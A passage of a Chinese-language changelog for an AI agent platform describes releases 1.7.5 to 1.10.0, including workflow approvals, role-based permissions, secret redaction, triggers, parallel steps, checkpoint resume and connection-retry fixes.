- `tests/server/test_refs_plan_goals.py`（17）：计划模式的模式切换与不适用场景、MCP 展开与失败回执、
  技能注入（Markdown / Python）、ReAct 必下发、目标存储 / 隔离 / 注入 / 回写 / 接口、计划批准 / 驳回 /
  通道异常 fail-closed / 修改后重规划 / 未开启时行为不变、`skill_invoke`。
- `tests/planning/test_budget_recovery.py`：0 的语义改为"不设限"（新增用例），负数回落旧派生值。

## [1.10.0] - 2026-10-04

**工作流治理与固化：发布审批、按工作流权限、多级按角色审批、运行审计、凭据保管、并发配额（企业版）；模板库、从执行轨迹生成工作流（专业版）**

工作流路线图（`docs/WORKFLOW_ROADMAP.md`）第三站，R-301 ~ R-308 落地，三版路线的规划项至此全部交付。
1.9.0 之后工作流能无人值守地跑起来，但"谁能改、谁能跑、跑的是不是批过的那一版、凭据放哪、
审计拿什么交"都还没有答案；好用的流程也只能复制粘贴。

### 根因 / 修复

- **审批回答不带身份**：工作流 `human` 步骤与工具审批的回答（界面点击 / 外部回执）此前只有
  "批准 / 拒绝"，没有"谁批的"—— 按角色审批无从谈起，审计里也写不出审批人。现在 WebSocket 连接
  记下连接方身份（SSO 会话 / 本机 / 令牌持有人），回答带上审批人；外部回执（管理员通道）可在请求体里
  说明 `approver`。
- **按工作流的权限此前没有接入点**：RBAC 只有角色矩阵，工作流接口从不询问"这个人能不能做"。
  社区核心加了身份解析与授权钩子（没有企业版治理特性时一律放行，行为与此前完全一致）。
- 从轨迹生成草稿时，参数里原有的 `{{` 一律转义成字面量：轨迹是当时的字面值，不能在工作流里变成取值指令。

### 新增 — 治理（企业版，R-301 ~ R-306，特性 `workflow_governance`）

- **发布审批**：草稿 / 待审批 / 已发布。提交时记下文件摘要，审批人批准后它成为已发布版本；
  **触发器（定时 / webhook / 自动续跑 / 重启续跑）只运行已发布版本**，文件改一个字就要重新审批，
  触发器列表直接显示"已被修改，新版本还没有通过发布审批"。批准时文件必须仍是提交的那一版（否则 409）；
  SSO 身份下不能批准自己提交的版本（四眼原则，可配置放开）。手动运行草稿默认允许（可配置为也要求已发布）。
- **按工作流权限**：RBAC 动作 `workflow:<view|edit|run|trigger|approve>:<文件>`；内置角色 developer
  新增工作流查看 / 编辑 / 运行 / 触发器权限，新增 approver（查看 + 批准发布）角色，viewer 可查看工作流。
  列表按查看权限过滤并回带当前身份能做什么；无运行权限调用运行接口返回 403。SSO 登录用户的工作流动作
  改由按工作流权限判定（不再要求管理员令牌）；凭据与并发配额仍只有管理员能改。
- **多级 / 按角色审批**：`human` 步骤 `approvers: [role:finance, role:manager]`（或 `user:alice`）+
  `mode: all`（按顺序逐级）/ `any`（任一人）。不是指定审批人的回答被拒收（界面提示、外部回执 403），
  弹窗继续等；任一级拒绝按失败策略处理。每一级"要谁、谁批的、何时、意见"写进报告 `detail.approvals`。
- **运行审计导出**：`GET /api/workflow/runs/{id}/audit?format=json|pdf` —— 文件与摘要、是否已发布版本、
  触发方式、发起人、输入、每步状态 / 起止时间 / 输出摘要 / 错误 / 审批人与时间，与报告逐条对应；
  装了 reportlab 输出 PDF，否则给打印版 HTML。
- **凭据保管**：`{{ secrets.NAME }}` 只能用在 tool 步骤的参数里（进 llm / agent 提示词、human 待批内容、
  branch 条件在加载期报错）。值从环境变量 `AUTOMIND_SECRET_<NAME>` 或凭据文件取（设置
  `AUTOMIND_SECRETS_KEY` 后 Fernet 静态加密）；执行器在报告、事件、落盘快照、日志里把明文替换成 `***`。
  凭据接口只写不读。
- **并发配额与排队**：按团队（SSO 用户的 team，缺省按角色；触发运行归入 triggers）限制同时运行数，
  超出自动排队，运行卡片显示"排队中 · 第 N 位"，排队时可停止（记为已取消、不计额度）。

### 新增 — 固化（专业版，R-307 / R-308）

- **从执行轨迹生成工作流**（特性 `workflow_from_trace`）：选一次**成功完成**的任务，生成 YAML 草稿 ——
  逐步工具（失败后被重试的调用省略）或一个 agent 步骤（工具白名单 = 实际用到的工具）。草稿附"需要人审的
  要点"（被截断的参数、疑似凭据的参数已换成占位），自动校验并试运行，打开到编辑器里人审后再保存。
- **工作流模板库**（特性 `workflow_templates`）：内置 3 份起步模板；编辑器「存为模板」；「＋ 新建」从模板开始；
  模板包导出 / 导入（按内容摘要去重，结构不完整的拒收）。

### 新增 — Web

- 「▶ 运行」页顶部「🛡 发布状态」（提交 / 批准 / 驳回、已发布版本与审批人）；列表标出发布状态；
  无权限的按钮变灰；引用凭据的工作流提示"需要凭据 X"；运行记录每行「审计」。
- 列表顶部「🧭 从轨迹生成」「🔑 凭据与并发配额」；「＋ 新建」改为模板选择；审批弹窗写明"这一级需要谁审批
  （第 k/n 级）"。

### 版本分层

- `workflow_from_trace` / `workflow_templates`（专业版）、`workflow_governance`（企业版）移入
  `COMMERCIAL_FEATURES`，`PLANNED_FEATURES` 清空。扩展上下文追加 `request_identity` / `workflow_authorize` /
  `workflow_can` / `workflow_policy` / `workflow_loader` / `workflow_dir` / `save_workflow_file`。
  SSO 会话增加 `team`（内置目录取用户条目的 `team`，LDAP 取 `ldap.team_map`）。

### 新接口

```
GET    /api/workflow/governance                         （企业版）
POST   /api/workflow/governance/{file}/submit|approve|reject
GET    /api/workflow/secrets   POST /api/workflow/secrets   DELETE /api/workflow/secrets/{name}
GET    /api/workflow/concurrency   POST /api/workflow/concurrency
GET    /api/workflow/runs/{run_id}/audit
GET    /api/workflow/from-trace/candidates   POST /api/workflow/from-trace        （专业版）
GET    /api/workflow/templates   POST /api/workflow/templates   DELETE /api/workflow/templates/{id}
POST   /api/workflow/templates/{id}/use   GET /api/workflow/templates/export   POST /api/workflow/templates/import
```

社区版 / 专业版访问不到的入口返回 403 + 升级提示；`secrets`、`concurrency`、`templates` 写操作属于管理动作。

### 测试

- `tests/workflow/test_v110_features.py`（26 项）：approvers / mode 校验与按版本拦截、逐级审批（顺序、
  第 2 级拒绝、any 只问一次、无 approvers 时旧回调签名不变）、凭据位置限制、工具拿真值而报告 / 事件 /
  快照 / 日志里是 `***`、缺凭据明确失败、试运行不需要值。
- `tests/server/test_workflow_v110_api.py`（18 项）：社区版入口降级、本机身份、列表回带权限、审批人匹配、
  外部回执按身份拒收。
- `pro/tests/test_workflow_governance.py`（24 项）：触发器只跑已发布版本（改一个字即失效）、四眼原则与
  提交后改动拒批、按工作流权限（403 / 列表过滤 / 试运行只需查看）、两级按角色审批端到端 + 审计逐条对应、
  凭据在报告 / 记录文件 / 任务历史 / 审计 / 日志 / 数据目录全部文件里都查不到、环境变量与静态加密、
  并发上限 2 时第 3 个排队并显示位次、排队中停止、轨迹草稿校验 + 试运行、模板保存 / 复用 / 导出导入。
- 新示例 `examples/06-workflow/pro-edition/governed_payment.yaml`（两级审批 + 凭据 + 定时）。

## [1.9.0] - 2026-10-04

**工作流无人值守（专业版）：定时 / webhook 触发器、parallel 并行组、运行历史与看板、失败自动续跑与通知**

工作流路线图（`docs/WORKFLOW_ROADMAP.md`）第二站，R-201 ~ R-209 落地。1.8.0 之后工作流
在 Web 上能写、能跑、能续，但"什么时候跑"仍然要人点或靠外部 cron；跑坏了没人知道，
互不依赖的步骤也只能排队一个个跑。

### 根因 / 修复

- **`then` 排在 `else` 后面时两条路都不走**：branch 的区间语义是"then 区间从 then 到 else 之前、
  else 区间从 else 到文件末尾"。then 排在 else 后面时，判定为真会把 then 目标连同 else 区间
  一起标成 skipped，主循环跳过去时它已经是"跳过"—— 两个分支都没执行，报告一片灰、整轮却是
  "成功"。加载期从未检查过这个顺序；现在直接报错并给出改法。
- **YAML 把裸写的 `on` 解析成布尔 true**：`notify: {on: [failed]}` 读出来的键是 `True`。
  按 `on` 认下，不让 YAML 1.1 的历史包袱变成"未知字段"。
- 条件解析只有一份（新模块 `workflow/conditions.py`，校验与执行共用）：此前加载期与执行期各写一份
  "找算子"，算子一多就会出现"校验说是 A、执行按 B 判"。占位符与引号串里的 `>`、`in` 不再被误认成算子。

### 新增 — 触发器（专业版，R-201 / R-202 / R-203）

- 工作流顶层 `triggers`：`cron`（5 段，支持区间 / 步长 / 列表 / 月份星期名 / `@daily` 等宏）或
  `webhook: true`；`inputs`、`enabled`、`retry`、`retry_delay`、`description`。加载期检查：cron 写法、
  **定时最小间隔**（专业版 5 分钟、企业版 1 分钟）、触发入参是否声明过、定时触发是否给全了必填入参。
- 调度循环每 15 秒检查一次；上一次还没跑完时到点的那一次**跳过**（不叠着跑）；停机期间错过的不补跑。
  触发运行用专用会话 `wf_<文件名>`（D4），与手动运行走**同一套**校验、入参、限额与每日额度判定。
- 入站 webhook：`POST /api/workflow/hooks/{key}`，凭触发器自己的令牌（`X-AutoMind-Hook-Token` 或
  Bearer）；令牌缺失 / 错误 / 触发器不存在一律 401，服务端只存 sha256 摘要，明文只在生成那一次返回；
  请求体就是入参（也可包一层 `{"inputs": {...}}`）。该路径不需要平台访问令牌，纳入速率限制。
- 活跃触发器上限（专业版 30 个，按文件名与声明顺序排先后）；超出的列出来并说明原因，第 31 个启用时
  返回 403 与"升级企业版"提示。启停状态与令牌存在数据目录 `workflow_triggers.json`，不改工作流文件。

### 新增 — 无人值守的善后（专业版，R-208 / R-209）

- **失败自动续跑**：触发运行 partial / failed 时按触发器的 `retry` **从断点**续跑（已成功的步骤不再执行），
  尝试次数计入运行记录；被人为停止的不重试。
- **通知**：工作流顶层 `notify: {on: [failed, partial, interrupted, ok], channels: [webhook, im, desktop]}`；
  默认失败 / 部分成功 / 被中断时发出站事件。内容含失败步骤（行号）与原因、是否将自动续跑。
  新增出站事件 `workflow.interrupted`、`workflow.completed`（后者仅在 `notify.on` 显式要求时发）。
  群机器人地址取 `AUTOMIND_IM_WEBHOOK`（与 `im_integration` 同一份配置），不写进工作流文件。
- **重启续跑策略**：顶层 `on_restart: resume / notify`（默认 notify）。服务启动时被打断的**触发运行**
  按策略自动续跑或只通知；手动运行仍然只提示（D5）。

### 新增 — 并行（专业版，R-204 / R-205）

- `type: parallel`：一组互不依赖的子步骤并发执行（`max_concurrency` 默认 4，上限 32）。组内互相引用
  加载期报错（它们同时在跑）；组结束后可直接引用 `{{ steps.<子步骤>.output }}`，组输出是
  `{子步骤: 输出}`。子步骤 abort 失败时还没启动的不再启动、已在跑的跑完为止；任一失败整组记失败。
- **续跑粒度到子步骤**（D2）：组里每个子步骤结束即落盘（带序号，迟到的旧快照不会覆盖新快照），
  续跑时只重跑没成功的那几个。
- `foreach` 加 `max_concurrency` 逐项并发：每一项有自己的上下文（`loop` 与子步骤输出互不串项），
  结果仍按项的顺序汇总；专业版单次 ≤ 1000 项，报告逐项明细只展开前 50 项、失败项序号全部列出。
- 并发执行器是专业版特性 `workflow_parallel` 的实现；社区核心只有语义一致的逐个执行兜底
  （正常路径上 parallel / 逐项并发在加载期就被拦下）。

### 新增 — 运行历史与看板（专业版，R-207）

- 运行记录按天保留：社区版最近 50 次、专业版 90 天、企业版按配置 `workflow_history_days`（缺省 365 天）。
  摘要按（文件, mtime）缓存，几千条记录时列表与看板也不必每次重读全文。
- `GET /api/workflow/dashboard?days=&file=`：按工作流统计运行数、成功 / 部分 / 失败 / 取消、成功率、
  平均与 P95 耗时、Token、按触发来源计数、按天趋势、最常失败的步骤；数据源就是运行记录（逐条对得上）。
  观测中心看板（`/api/observe/dashboard`）增加 `workflows` 一栏。

### 新增 — 条件扩展（全部版本，R-206）

- branch 新增 `>` `<` `>=` `<=`（数值比较）、`in`（右侧为字面量列表 `[a, b]` 或渲染成列表的模板）、
  `exists`（单个占位符取得到且不为 null）。仍是白名单、不求值；数值比较遇到非数字、`in` 的右侧不是列表时
  该步骤**判失败**，不静默走 else。未知算子（`=~`、`matches`、`===`、`not in`）在加载期报错并给出可选值。

### 新增 — Web

- 「🔀 工作流」新增「⏰ 触发器」页：每个触发器的生效状态与原因、下次运行时间、最近一次结果、启停、
  立即触发、生成 / 重置 webhook 令牌（只显示一次）；列表里带触发器的工作流标 ⏰。
- 列表顶部「📊 看板」；运行卡片显示 parallel 子步骤的逐个进度、触发来源（⏰ 定时 / 🔗 webhook）；
  运行记录增加"来源 / 第几次尝试"列。社区版打开这两处显示升级说明。

### 版本分层

- `workflow_triggers` / `workflow_parallel` / `workflow_history` 从 `PLANNED_FEATURES` 移入
  `COMMERCIAL_FEATURES`（专业版 / 企业版许可证自动开启）；`QUOTA_RULES` 增加 `workflow_history_days`；
  新增 `quota.check_workflow_triggers()`。扩展上下文追加 `workflow_catalog` / `workflow_store` /
  `start_workflow` / `resume_workflow` / `workflow_running` / `data_dir`（对既有扩展向后兼容）。

### 新接口

```
GET  /api/workflow/triggers                    （专业版）
POST /api/workflow/triggers/{key}/toggle       （专业版，管理动作）
POST /api/workflow/triggers/{key}/token        （专业版，管理动作）
POST /api/workflow/triggers/{key}/run          （专业版，管理动作）
POST /api/workflow/hooks/{key}                 （专业版，凭触发器令牌）
GET  /api/workflow/dashboard                   （专业版）
```

社区版这 6 个入口返回 403 + 升级提示；`GET /api/workflow/runs` 增加 `trigger_key` 过滤。

### 测试

- `tests/workflow/test_v19_features.py`（88 项）：cron 解析与最小间隔、触发器 / on_restart / notify 声明校验
  与按版本拦截、parallel 校验与执行（并发度、abort 停止未启动的、子步骤级续跑、整组恢复、取消传播）、
  foreach 逐项并发（不串项、按项序汇总、大规模报告有界）、9 种条件算子与加载期拒绝。
- `tests/server/test_workflow_v19_api.py`（12 项）：社区版入口降级、webhook 路径豁免平台令牌、
  管理动作划分、触发运行专用会话、保留口径、内部发起入口与 REST 同一套判定。
- `pro/tests/test_workflow_pro.py`（26 项）：并发执行器、第 31 个触发器被拦、定时到点运行、
  上一次未完跳过、webhook 401 / 令牌轮换 / 入参映射、失败通知 + 断点自动续跑（调用计数证明不重复执行）、
  重启续跑 / 只通知、看板与记录逐条一致、按天清理、专业版示例。
- 新示例：`examples/06-workflow/triage.yaml`（条件扩展，社区版）、`examples/06-workflow/pro-edition/`
  （`nightly_sync.yaml` 定时 + 并行 + 重试通知、`inbound_tickets.yaml` webhook + 逐项并发）。

## [1.8.0] - 2026-09-30

**工作流可用化：Web 上写好、跑起、看懂、续上一条工作流；新增 agent 与 foreach 步骤**

工作流路线图（`docs/WORKFLOW_ROADMAP.md`）第一站，R-101 ~ R-110 全部落地。
此前工作流引擎只有 CLI 与一个同步阻塞的 REST 接口：Web 无入口、跑的时候看不到进度、
停不下来、失败后只能从头再跑，也没有"交给 Agent 做一步"的能力。

### 根因 / 修复

- **REST 运行时 `human` 步骤永远被判拒绝**：`POST /api/workflow/run` 把签名为
  `(tool, args, tier, reason)` 的审批回调直接当成执行器要的 `(step, prompt)` 调用，
  每次都抛 `TypeError`，被执行器按"审批通道异常 → 拒绝"收尾。整条"工作流 + 人工审批"
  链路经 REST 从未真正问到过人。现在走同一条审批链路的适配器（同一张待决表、同一套超时处置、
  同一个外部回执端点），审批请求带上 `workflow_run_id` / `step_id`。
- **`llm` 步骤写 `retry(n)` 根本不重试**，失败后还按 `continue` 放行 —— 与文档
  "retry 用尽按 abort 处理"相反。现在 `llm` / `agent` 步骤按 `retry(n)` 真正重试，
  用尽即中止；不支持重试的类型（human / branch / foreach）写了 retry 失败即视为用尽。
- 未知字段错误此前没有行号（标量值不带位置），现在退到所在步骤的行号，界面点击可跳转。

### 新增 — 运行（R-101 ~ R-105）

- **异步运行**：`POST /api/workflow/run` 立即返回 `run_id`，执行放后台；WebSocket 推送
  `wf_run_start` / `wf_step_start` / `wf_step_done` / `wf_iteration` / `wf_agent_action` /
  `wf_run_done`。`wait: true` 保留"跑完再返回报告"的旧语义（CI 用）；dry-run 始终同步。
- **查询与停止**：`GET /api/workflow/runs/{id}`（进行中返回实时进度，结束后返回报告）、
  `POST …/cancel`（当前步骤标 `cancelled`、整轮 `cancelled`，取消经 asyncio 传到工具层）。
- **按步落盘 + 断点续跑**：每个顶层步骤结束即把记录与成功步骤的输出原子写入
  `<数据目录>/workflow_runs/`；`POST …/resume` 已成功的步骤直接沿用结果、**一次都不重复执行**，
  branch 重新判定。文件改过（摘要不同）拒绝续跑；一次运行只能被续跑一次；服务重启时未跑完的
  运行记为 `interrupted`，只提示、不自动续跑（D5）。状态词与对话任务的检查点一致。
- **记账**：每次运行（含续跑）计 1 次任务额度并写入任务历史（`interaction="workflow"`，附报告）（D3）。
- **走会话体系**（D4）：运行用独立的会话克隆（Token 计数与同会话对话任务互不干扰；运行中不会被
  LRU 淘汰），会话身份与隔离工作目录按发起会话绑定，开启隔离时推送产物卡片。
- WebSocket 新增 `bind` 动作：页面打开 / 切换会话时声明所看的会话，后台运行的进度与审批弹窗
  才送得到刷新过的页面。

### 新增 — 步骤类型（R-106 / R-107）

- **`agent`**：`goal` + `allowed_tools` + `max_steps`（默认 20）+ `token_budget` + `mode: react`。
  工具集 = 白名单 ∩ 运行时可用工具（未声明时只给只读工具，并在加载期提醒）；白名单外的调用
  不执行、不弹审批，写进报告 `denied_tools`（D1）；步骤 token 预算用尽走 ReAct 的部分交付路径。
  输出 `{answer, artifacts, actions_ok, actions_failed, stop_reason}`（D6）。
- **`foreach`**：`items` + 子步骤，子步骤里用 `{{ loop.item }}` / `{{ loop.index }}`；
  子步骤只在循环内可见，整步输出为逐项记录列表；子步骤 abort → 剩余项不执行。
  上限按版本（社区版 20 / 专业版 1000）：字面量列表在**校验阶段**报错并给行号，模板在展开后、
  执行第一项之前判定（超限一项都不执行）。
- 示例：`examples/06-workflow/agent_report.yaml`（tool → agent → human → tool）、
  `batch_notes.yaml`（离线 foreach）。

### 新增 — Web（R-108 / R-109）

- 侧栏「工作台 → 🔀 工作流」：列表（校验状态 / 最近运行 / 超限标注）、在线编辑与实时校验
  （错误定位到行、点击跳转、Ctrl+S 保存）、按 `inputs` 自动生成入参表单、试运行计划表、
  运行进度卡片（停止 / 续跑 / 下载报告）、运行记录（续跑 / 忽略）。
- 输入框「＋」菜单「▶ 运行工作流…」，运行卡片出现在当前会话；审批弹窗标明
  "来自工作流 X 第 N 步"，human 步骤整段展示待批内容。

### 新增 — 限额与拦截（R-110）

- `QUOTA_RULES` 增加 `workflows`（20 / 200 / 不限）、`workflow_triggers`、`workflow_min_interval`、
  `workflow_history`、`workflow_foreach_max`；`workflow_triggers` / `workflow_parallel` /
  `workflow_history` / `workflow_from_trace` / `workflow_governance` 预登记在新表
  `edition.PLANNED_FEATURES`（带计划版本），实现交付时再移入 `COMMERCIAL_FEATURES`
  —— 后者每一项都必须有真实现，否则企业版许可证的特性开关会出现"未授权"、界面显示 🔒。
- 超出数量上限的工作流仍可列出、校验、dry-run，运行时返回 403 与说明。
- `type: parallel`、顶层 `triggers` 在**加载期**拦截并说明需要哪个版本（版本已满足但尚未实现的
  如实说明计划版本，不劝专业版用户"升级到专业版"），不会报"未知字段"。
- 出站事件 `workflow.failed` / `workflow.partial`（全绿不发），`extra` 带 `run_id` /
  `failed_step` / `summary` / `resumable`。

### 新接口

```
GET  /api/workflow/runs
GET  /api/workflow/runs/{run_id}
POST /api/workflow/runs/{run_id}/cancel
POST /api/workflow/runs/{run_id}/resume
POST /api/workflow/runs/{run_id}/dismiss
GET  /api/workflow/source
POST /api/workflow/save
POST /api/workflow/delete
```

`runs/*`、`save`、`delete` 与 `run` 同属管理动作（远程须 `X-Admin-Token`）。

### 测试

- `tests/workflow/test_v18_steps.py`（49 项）：agent / foreach 校验与执行、版本拦截、retry 修正、
  续跑与按步快照、工具白名单注册表、步骤预算、真实 ReAct 循环下的越权拒绝与审批分流。
- `tests/server/test_workflow_runs_api.py`（13 项）：立即返回、停止、续跑不重复执行（调用计数）、
  摘要不符拒绝续跑、限额、出站事件、human 审批链路、保存 / 删除、管理权限。
- 示例测试覆盖两份新示例；路由快照新增 8 个端点。

## [1.7.8] - 2026-09-29

**输入框改版为输入卡片：视觉更清晰，功能不变**

纯视觉版本。发送、插入补充、停止、＋ 菜单（附件 / 语音 / 本条模式 / 本条专家）、
草稿保存与自动增高、执行中可继续输入等行为与 1.7.7 完全一致。

### 改进 — 输入区

- **输入卡片**：原来是"＋ 按钮 | 独立描边的文本框 | 发送按钮"横排，改为一张卡片：
  文本区在上、工具栏在下，整张卡片共用一个聚焦光圈；点卡片空白处即聚焦输入。
- **工具栏信息**：显示本次发送将使用的模式（在 ＋ 菜单里选了"本条用…模式"时，
  以虚线标签标出"· 本条"）；右侧常驻快捷键提示（`Enter` 发送 · `Shift+Enter` 换行，
  执行中切换为"`Enter` 插入补充"），窄屏自动隐藏。
- **状态更醒目**：执行中卡片带渐变描边，提示此刻输入的是补充而非新任务；语音聆听中
  显示红色脉冲标签（点击即停止）；没有可发送的内容时发送键调暗（点击行为不变）；
  发送 / 停止改为矢量图标。
- 深色 / 浅色主题分别调整了卡片阴影与聚焦光圈；尊重系统"减少动效"设置。
- 修正：断点续跑提示条在正常宽度下「忽略」按钮被挤到第二行。

### 兼容性说明

- 输入容器保留了 `input-inner` 类名 —— 「任务历史」里的"重新填入"依赖
  `.input-inner textarea` 定位输入框，改版后照常工作。
- 已知问题（非本版引入）：整体界面尚未适配手机宽度（侧栏与右侧观测面板为固定宽度），
  窄屏下会出现横向溢出；输入卡片本身在窄屏下会收起快捷键提示。

## [1.7.7] - 2026-09-29

**断点续跑接到 Web；隔离工作区产物可见可取回、磁盘有上限；输入框加号菜单**

### P0-1 — 真续跑接到 Web（此前只有 CLI 能用）

`resume_from_checkpoint` 在 1.7.5 就实现了"只跑剩余步骤"，但 Web 端 `server.py` 里
对检查点零引用：「继续此任务」其实是前端把原任务文本加一段"请先检查进度"再发一遍
（`ChatPanel.tsx` 的注释里自己认了账），而且 `lastTask` 存的是**已套前缀的文本**，
连续续跑会把前缀嵌套成两层、三层。

- **Web 走真正的续跑**：WS `run` / REST `/api/run` 新增 `resume_checkpoint` 字段。服务端
  校验断点属于本会话且仍有效，任务原文取自断点（不信任前端），调用
  `resume_from_checkpoint`。新接口 `GET /api/checkpoints/resumable`、
  `POST /api/checkpoints/{id}/dismiss`。
- **ReAct（编程 / 工作）也能续**：此前检查点只对计划路径有意义 —— ReAct 没有计划，
  断点里什么进度都没有。现在每步落盘时记下**已真实完成的动作、产出的文件、未解决的失败、
  中断原因**；续跑时把这份事实清单交给模型（`build_react_resume_prompt`），明确不要重做。
- **检查点如实标记状态**：每个任务开头写入原始任务、交互模式与 `status=running`；
  收尾时区分 `completed` / `partial`（部分交付：步数上限、预算、断线）；被取消或抛错时
  **强制**落盘并标 `interrupted`（绕过 15 秒节流，最后几步不丢）；续跑后源断点标 `resumed`，
  不会重复续跑。任务开头清空上一轮残留的计划（会话克隆跨任务复用，此前 ReAct 任务的
  检查点可能带着上一个计划任务的计划）。
- **会话匹配修正**：检查点按 `ckpt_<sid>_` 前缀匹配，会话 `s_abc` 会把同一浏览器另一个
  会话 `s_abc_c1234` 的断点也算进来。改为精确解析（`session_of`）。
- **裁剪不再误删**：`prune` 只按全局数量保留，多个会话并发时会把别的会话"最后那个没跑完的
  断点"挤掉。现在额外保留每个会话最新的一份。
- **计划续跑也按会话执行**：绑定会话身份与隔离工作目录、按任务重置 Token 预算，与正常任务一致。
- 前端：会话里有未完成任务时输入框上方提示「↻ 从断点续跑 / 忽略」；失败卡片「继续此任务」
  优先走断点，找不到断点才退回文本提示，且先剥掉已有前缀。

### P0-2 — 隔离工作区三个补丁

- **产物落点不明显**：此前回复里只有副本路径和一句"调用工作区导出"——而导出没有任何入口。
  现在复制时记录基线清单（`.automind_ws.json`），任务结束推送 `workspace_result`，界面出现
  产物卡片：列出新增 / 修改的文件，一键**应用到项目**（只复制改过的文件；任务期间用户也改过
  的文件判为冲突、先询问；每个覆盖写入改动日志可撤销；副本里的删除不外溢）、导出、删除副本。
- **磁盘按会话翻倍**：此前只限文件数（4000），实测最坏 1.16GB。现在复制前扫描：总体积超过
  `workspace_max_mb`（默认 500）直接降级并说明原因；单个超过 `workspace_large_file_mb`
  （默认 20）的文件不复制，且不会被误判为"Agent 删掉了"。
- **副本不会被主动清理**：此前只在下一次跑任务时按 `workspace_keep` 淘汰。现在服务端每小时
  按 `workspace_ttl_hours`（默认 72）清理闲置副本（正在跑的不动），删除会话时一并清理，
  淘汰按"最近使用"而非目录 mtime。新接口 `/api/session-workspaces`（列表 / 改动 / 应用 /
  导出 / 删除 / 清理），「工作区管理」里可查看占用并清理。

### 新增 — 输入框加号菜单与 overrides 协议

- 输入框左侧 **＋** 菜单：📎 附件（图片走多模态；文本 / 代码文件 ≤1MB、最多 10 个随消息发送；
  PDF / Word 提示走知识库）、🎤 语音、**本条用…模式发送**、**本条挂专家**。
- **overrides 协议**：`run` 新增可选 `overrides: {mode?, expert?, attachments?}` 与 `ref`。
  只作用于这一条消息 —— 模式覆盖不写成默认、并在克隆拿到后复原全局模板；专家覆盖可指定或
  显式"不使用"；带附件的消息不会命中只看原文的语义缓存。专业版模式在服务端按授权校验。
- **chip 回执**：`task_start` 带回逐项回执，用户消息上的 chip 显示 ✓ 已生效 / ✕ 未生效（附原因）；
  任务没能开始时同样标为未生效，不会一直挂在"等待确认"。

### 测试

新增 `test_web_resume.py`、`test_workspace_governance.py`、`test_overrides_and_resume_api.py`
（共 22 个用例）；路由清单快照新增 8 个端点；全量套件通过。

## [1.7.6] - 2026-09-28

**长任务不再被一次断线打断；会话归档与项目记忆；设置面板全面可用**

### 修复 — 任务跑一段时间就报 "Connection error."

根因：openai SDK 的 `APIConnectionError` 文本恰好是 `"Connection error."`，而
`_create_with_retry` 靠关键字（`connection reset` / `peer closed` …）识别网络错误
—— **一个都不中**，于是这类错误被当成不可重试，原样上抛，整轮长任务作废。
长任务要调几十次模型，只要其中一次碰上中转抖动就失败。

- **分类重试**：新增 `classify_llm_error()`，按异常类型 / HTTP 状态码归类为
  connection / server(5xx) / rate_limit / timeout / parse / fatal，取代散落在各
  provider 里的关键字匹配。连接、5xx、限流最多 5 次指数退避（2s 起、上限 30s），
  超时 1 次，401/403/400 等立即失败不浪费时间。OpenAI 与 Anthropic 共用同一实现
  （Anthropic 此前只有 SDK 自带的 2 次快速重试）。
- **建连超时单独 15 秒**：此前各阶段共用 120 秒，代理挂掉时每次尝试都在建连阶段
  干等 120 秒，单轮 300 秒硬上限下重试形同虚设。
- **连接池**：空闲连接 15 秒过期（原 30 秒，常见中转空闲超时就在 15~30 秒之间，
  工具跑一会儿再回来调模型正好拿到被对端关掉的连接）；传输层对建连失败自动重试 2 次。
  修正了自定义 transport 时 httpx 忽略客户端级 `limits` 的问题。
- **任务层重连**：provider 层重试用尽后，ReAct 循环再按 10s / 30s / 60s 等待重连，
  并推送 `llm_reconnect` 事件（界面显示"连接中断，N 秒后重连"/"已恢复"）。
  仍连不上时：已做过实事 → 交**部分交付清单**（新停止原因 `llm_unavailable`）；
  一步没做 → 照常报错。收尾阶段（质量评估/反思）断线同样降级而不是判失败。
- 新异常 `LLMConnectionError`，报错文案写明连的是哪个地址、重试了几次、该查什么。

### 新增 — 工作区会话管理（项目化隔离 · 长期记忆 · 上下文延续）

- 每个工作区可有**多个会话**：新建 / 切换 / 重命名 / 置顶 / 删除，按浏览器 + 工作区隔离。
  旧版唯一的那条会话作为「默认会话」原样保留，升级后历史不丢。
- **归档**：整理要点（能调模型就让模型写，否则抽取式兜底），**写入工作区长期记忆**。
- **项目记忆**：新会话第一轮自动注入本工作区最近几条归档要点（只注入首轮，不重复付费）。
- **接着聊**：从任一会话新开延续会话，源会话要点作为种子。
- 新接口：`GET/POST /api/conversations`、`PATCH/DELETE /api/conversations/{sid}`、
  `POST /api/conversations/{sid}/archive`；SQLite 新表 `conversations`。
- `Ctrl+N` 改为「新建会话」；顶栏原「🔄 新会话」（实为清空）更名「🧹 清空」。

### 修复 — 设置面板

- **执行治理的 11 个数值项全部显示为空**：`GET /api/config/autopilot` 只返回布尔开关。
  现在返回完整快照（含审批超时处置 / 写冲突策略），POST 返回快照 + 被拒绝的键及原因。
- **改了设置对当前会话不生效**：会话克隆深拷贝了配置，改动只落到全局实例。现在同步到
  所有已存在的会话。
- 数值项此前**每按一个键就保存一次**（输入 600 会先提交 6）；改为失焦 / 回车保存并夹到合法区间。
- **API Keys「保存」空输入会删除已配置的 Key**（占位符写着"留空不改"）；保存与删除分开，删除需确认。
- 模型配置 / 通用设置加载失败时不再是空白弹窗：显示加载态、错误与重试；模型名改用
  可自由输入的 AutoComplete；保存有进行中状态并校验 api_base。
- 采样参数改动即保存；新增「单任务最大步数」「单任务 Token 预算」两项；启动时数值参数
  按整数恢复（不再把 8 存成 8.0）。
- 轨迹面板默认查询**当前会话**（此前固定查 `default`，永远显示"暂无轨迹"）。

### 改进 — 工具调用成功率

- **截断的参数不再执行**：参数 JSON 被 `max_tokens` 截断时，此前要么以空参数执行
  （模型被告知"缺参数 path"，修错方向），要么被 `repair_json` 补齐后**把半截内容写进文件**。
  现在标记在 `ToolCall.arguments_error` 上，不执行并告诉模型拆小重试。
- 可确定的参数名自动纠正（`filePath` / `file-path` → `file_path`），与工具名同一策略。
- 按 schema 自动类型转换：`"600"` → 600、`"true"` → True、JSON 字符串 → 数组/对象、单值 → 数组。
- 必需参数执行前预检，并把"写错的名字 → 该用的名字"一并提示。

### 改进 — 界面

- 左侧导航重做：工作区徽标、新建会话、会话列表（活动时间 / 轮数 / 运行中指示）、
  已归档折叠区、可折叠的「工作台」「系统」分组；可收起为图标栏（状态记忆）。

### 测试

新增 `test_llm_connection_resilience.py`、`test_conversations.py`、
`test_settings_autopilot.py`、`test_tool_call_hardening.py`（共 60+ 用例）；全量套件通过。

## [1.7.5] - 2026-09-19

**长任务不再被预算掐死；工具调用失败率显著下降**

这一版来自一次完整的性能/稳定性实测（方法：产品自带测试套件 + 自带 smoke 评测
套件真跑 + 零成本仿真对照）。所有数字都是实测值，不是估算。

修复前实测出的**四个硬伤**：

